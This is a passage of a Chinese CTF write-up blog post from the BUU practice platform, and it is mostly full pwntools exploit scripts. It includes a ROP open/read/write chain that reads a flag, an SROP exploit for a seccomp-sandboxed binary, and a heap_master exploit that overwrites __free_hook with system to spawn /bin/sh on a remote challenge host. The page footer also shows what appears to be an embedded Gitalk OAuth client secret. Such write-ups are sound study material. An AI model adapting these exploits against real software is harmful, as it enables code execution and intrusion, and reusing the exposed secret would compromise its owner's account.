<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">puts_addr = int(p.recvline(),<span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000021102</span>+libc_base</span><br><span class="line">pop_rdx_rsi = <span class="number">0x00000000001150c9</span>+libc_base</span><br><span class="line">ret = <span class="number">0x0000000000000937</span> + libc_base</span><br><span class="line">stack_addr = libc.sym[<span class="string">'environ'</span>]  <span class="comment"># environ是libc存储的栈地址</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x8</span>) + p64(stack_addr) + p64(libc.sym[<span class="string">'read'</span>])  <span class="comment">#调用read函数，第一个参数写在了第二次输入的最后</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(stack_addr) + p64(pop_rdx_rsi) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x100</span>) + p64(stack_addr+<span class="number">8</span>) + p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x100</span>) + p64(stack_addr+<span class="number">8</span>) + p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">payload += <span class="string">"a"</span>*(<span class="number">0x180</span>-len(payload))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x78</span> + p64(pop_rdi_ret)</span><br><span class="line">p.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">"flag\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="新增知识点"><a href="#新增知识点" class="headerlink" title="新增知识点"></a>新增知识点</h4><p>read（3,fstack+8,0x100),3是文件读入（0是键盘读入）<br>ps:flag字符如果没有’\x00’截断是不可以过的</p>
<h3 id="V-amp-N2020-公开赛-babybabypwn"><a href="#V-amp-N2020-公开赛-babybabypwn" class="headerlink" title="[V&amp;N2020 公开赛]babybabypwn"></a>[V&amp;N2020 公开赛]babybabypwn</h3><p>也是开了沙箱的一题</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">coyote@ubuntu:~/Yee/V&amp;N$ seccomp-tools dump ./vn_pwn_babybabypwn_1</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>

<p>题目：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_1347</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to v&amp;n challange!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Here is my gift: 0x%llx\n"</span>, &amp;<span class="built_in">puts</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input magic message: "</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  syscall(<span class="number">15L</span>L, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不过这题用了srop，一下子没想起来syscall 15是干嘛用的，后来经大佬提点才发现是srop。</p>
<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span> </span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./vn_pwn_babybabypwn_1"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./vn_pwn_babybabypwn_1"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line">stack_addr = libc.sym[<span class="string">'environ'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">puts_addr = int(p.recvline(),<span class="number">16</span>)</span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">"libc_base==&gt;"</span> + hex(libc_base))</span><br><span class="line">libc.address = libc_base</span><br><span class="line">stack_addr = libc.sym[<span class="string">'environ'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000021102</span> + libc_base</span><br><span class="line">pop_rdx_rsi = <span class="number">0x00000000001150c9</span> + libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000001b92</span> + libc_base</span><br><span class="line">syscall_addr = <span class="number">0x00000000000bc375</span> + libc_base</span><br><span class="line"></span><br><span class="line">srop = SigreturnFrame()   <span class="comment"># pwntools提供了Sigreturn Frame的构建</span></span><br><span class="line">srop.rax = constants.SYS_read</span><br><span class="line">srop.rdi = <span class="number">0</span></span><br><span class="line">srop.rsi = stack_addr</span><br><span class="line">srop.rdx = <span class="number">0x200</span></span><br><span class="line">srop.rsp = stack_addr + <span class="number">8</span></span><br><span class="line">srop.rip = syscall_addr</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = str(srop)[<span class="number">8</span>:]</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">shell = <span class="string">"flag"</span> + <span class="string">"\x00"</span>*<span class="number">4</span> + p64(pop_rdi_ret) + p64(stack_addr) + p64(pop_rdx_rsi) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">shell += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x100</span>) + p64(stack_addr) + p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">shell += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rdx_rsi) + p64(<span class="number">0x100</span>) + p64(stack_addr) + p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line"></span><br><span class="line">p.send(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>ps：和前一道栈题其实很像</p>
<h3 id="CTF2019-heap-master"><a href="#CTF2019-heap-master" class="headerlink" title="*CTF2019 heap_master"></a>*CTF2019 heap_master</h3><p>这道我用unsorted bin + global max fast +  free_hook通的（unsorted bin + IO_frush_all_lockp可能是用到栈上的地址，ret填了太多，所以一直是timeout</p>
<p>详细过程的话就看我<a href="https://c0yo7e.github.io/2020/08/01/largebin-attack-glibc2-23/#2019-CTF-heap-master" target="_blank" rel="noopener">另一篇blog</a>吧</p>
<h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> sc_expwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># p = process('./heap_master')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27915</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'size: '</span>, str(size))</span><br><span class="line">	<span class="comment"># else:</span></span><br><span class="line">	<span class="comment"># 	self.sendline('1')</span></span><br><span class="line">	<span class="comment"># 	self.sendline(str(size))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">    <span class="comment"># if self.wait:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(len(content)))</span><br><span class="line">    p.sendafter(<span class="string">'content: '</span>, content)</span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sendline('2')</span></span><br><span class="line">        <span class="comment">#     self.sendline(str(offset))</span></span><br><span class="line">        <span class="comment">#     self.sendline(str(len(content)))</span></span><br><span class="line">        <span class="comment">#     self.send(content)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.sendline(str(offset))</span><br><span class="line">	p.sendline(str(len(content)))</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(offset)</span>:</span></span><br><span class="line">	<span class="comment"># if self.wait:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'offset: '</span>, str(offset))</span><br><span class="line">	<span class="comment"># else:</span></span><br><span class="line">	<span class="comment"># 	self.sendline('3')</span></span><br><span class="line">	<span class="comment"># 	self.sendline(str(offset))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_</span><span class="params">(offset)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">libc_guess = <span class="number">0x7ffff7a0d000</span></span><br><span class="line">offset_libc_free_hook= libc_guess +libc.symbols[<span class="string">'__free_hook'</span>] </span><br><span class="line"><span class="keyword">print</span> hex(offset_libc_free_hook)</span><br><span class="line">offset_max_fast   = offset_libc_free_hook +<span class="number">0x50</span></span><br><span class="line"><span class="comment"># offset_max_fast=libc_guess+libc.symbols['global_max_fast']</span></span><br><span class="line">offset_libc_stdout=libc_guess+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x8</span>,p64(<span class="number">0x91</span>)) <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0x98</span>, p64(<span class="number">0x21</span>)) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0xb8</span>, p64(<span class="number">0x21</span>)) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">0x10</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit(<span class="number">0x18</span>, p16((offset_max_fast<span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line">malloc(<span class="number">0x80</span>)<span class="comment">#global_max_fast 赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>))</span><br><span class="line">edit(<span class="number">0xf8</span>, p64(<span class="number">0x11</span>)) </span><br><span class="line"></span><br><span class="line">free(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0x18</span>, p16((offset_libc_stdout+<span class="number">0x10</span><span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>)) <span class="comment">#read_end</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">edit_(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>))</span><br><span class="line">free_(<span class="number">0x10</span>)</span><br><span class="line">edit_(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit_(<span class="number">0x18</span>, p16((offset_libc_stdout+<span class="number">0x20</span><span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>)) <span class="comment">#write_base</span></span><br><span class="line">malloc_(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x20</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">fake = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(fake)</span><br><span class="line">addr_buf_base = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(addr_buf_base)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-16</span> - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">p.recv(<span class="number">0x838</span>)</span><br><span class="line">addr_stack= u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3</span></span><br><span class="line"><span class="keyword">print</span> hex(addr_stack)</span><br><span class="line"></span><br><span class="line">libc.address=libc_addr</span><br><span class="line">addr_libc_gets          = libc.sep_function[<span class="string">'gets'</span>]</span><br><span class="line">addr_libc_stdout        = libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">addr_libc_dl_open_hook  = libc.symbols[<span class="string">'_dl_open_hook'</span>]</span><br><span class="line">addr_libc_io_file_jumps = libc.symbols[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">addr_libc_io_str_jumps  = addr_libc_io_file_jumps + <span class="number">0xc0</span></span><br><span class="line">fastbin_ptr=libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x1c88</span> +<span class="number">8</span></span><br><span class="line">free_hook=libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">system_addr=libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size=<span class="number">0x3920</span></span><br><span class="line">fake_size=p64(size+<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0x38</span>,fake_size)</span><br><span class="line">edit(<span class="number">0x30</span>+size,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">free(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x40</span>,p64(system_addr))<span class="comment">#修改fd为system</span></span><br><span class="line">malloc(<span class="number">0x3910</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x110</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">0x110</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/08/02/BUU刷题集/" data-id="ckdcmyqjo00009gswj7qv9q49"
         class="article-share-link">Share</a>
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/">wp</a></li></ul>

    </footer>

  </div>

  
    
  <nav class="article-nav">
    
    
      <a href="/2020/08/01/largebin-attack-glibc2-23/" class="article-nav-link">
        <strong class="article-nav-caption">Olde posts</strong>
        <div class="article-nav-title">largebin_attack-glibc2.23</div>
      </a>
    
  </nav>


  

  
    
  <div class="gitalk" id="gitalk-container"></div>
  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
  <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
  <script type="text/javascript">
    var gitalk = new Gitalk({
      clientID: '57453e2505e1523b1d78',
      clientSecret: 'c9d2109f4649be7dca5ef5622d85e38608a7cd1e',
      repo: 'content',
      owner: 'C0yo7e',
      admin: ['C0yo7e'],
      // id: location.pathname,      // Ensure uniqueness and length less than 50
      id: md5(location.pathname),
      distractionFreeMode: false,  // Facebook-like distraction free mode
      pagerDirection: 'last'
    })

  gitalk.render('gitalk-container')
  </script>

  

</article>



</section>
  <footer class="footer">
  <div class="outer">
    <div class="float-right">
      <ul class="list-inline">
  
    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
  
</ul>
    </div>
    <ul class="list-inline">
      <li>&copy; 2020 The lair of C0yo7e</li>
      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
    </ul>
  </div>
</footer>

</main>

<aside class="sidebar sidebar-specter">
  
    <button class="navbar-toggle"></button>
<nav class="navbar">
  
    <div class="logo">
      <a href="/"><img src="/images/time.png" alt="The lair of C0yo7e"></a>
    </div>
  
  <ul class="nav nav-main">
    
      <li class="nav-item">
        <a class="nav-item-link" href="/">Home</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/archives">Archives</a>
      </li>
    
      <li class="nav-item">
        <a class="nav-item-link" href="/about">About</a>
      </li>
    
    <li class="nav-item">
      <a class="nav-item-link nav-item-search" title="搜索">
        <i class="fe fe-search"></i>
        Search
      </a>
    </li>
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      <div class="totop" id="totop">
  <i class="fe fe-rocket"></i>
</div>
    </li>
    <li class="nav-item">
      
        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
          <i class="fe fe-feed"></i>
        </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
  </aside>
  <script src="/js/jquery-2.0.3.min.js"></script>
<script src="/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/lazyload.min.js"></script>
<script src="/js/busuanzi-2.3.pure.min.js"></script>

  <script src="/fancybox/jquery.fancybox.min.js"></script>



  <script src="/js/tocbot.min.js"></script>
  <script>
    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
    tocbot.init({
      tocSelector: '.tocbot',
      contentSelector: '.article-entry',
      headingSelector: 'h1, h2, h3, h4, h5, h6',
      hasInnerContainers: true,
      scrollSmooth: true,
      positionFixedSelector: '.tocbot',
      positionFixedClass: 'is-position-fixed',
      fixedSidebarOffset: 'auto',
    });
  </script>


<script src="/js/ocean.js"></script>

</body>
</html>